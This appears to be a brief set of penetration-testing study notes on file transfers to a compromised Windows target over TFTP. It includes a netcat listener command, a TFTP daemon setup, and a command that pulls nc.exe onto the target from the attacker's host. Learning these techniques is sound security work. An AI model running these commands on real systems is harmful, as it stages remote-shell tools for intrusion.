# File Transfers


* Limit the commands on target machine to be non-interactive

## TFTP Transfers

* UDP
  * XP -2003 contained TFTP client by default
* Not ideal
* Mostly non-interactive

`nc -nlvp 443`

`atftpd --daemon --port 69 /tftp`

copy windows version of netcat to /tftp

Invoke tftp client on windows box.

`tftp -i <IP> GET nc.exe`
